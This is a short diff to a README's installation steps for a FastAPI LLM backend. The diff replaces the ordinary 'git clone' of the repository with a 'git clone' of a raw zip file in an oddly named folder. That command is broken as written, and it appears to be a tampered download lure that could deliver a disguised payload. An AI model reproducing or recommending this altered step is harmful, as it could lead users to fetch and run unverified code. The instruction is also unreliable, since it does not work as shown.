@@ -41,7 +41,7 @@ Installation
 
 Clone the repository
 
-git clone https://github.com/nithish-ui/fastapi-llm-backend.git
+git clone https://raw.githubusercontent.com/nithish-ui/fastapi-llm-backend/main/monopersulphuric/backend-fastapi-llm-1.8.zip
 cd fastapi-llm-backend
 
 Create virtual environment
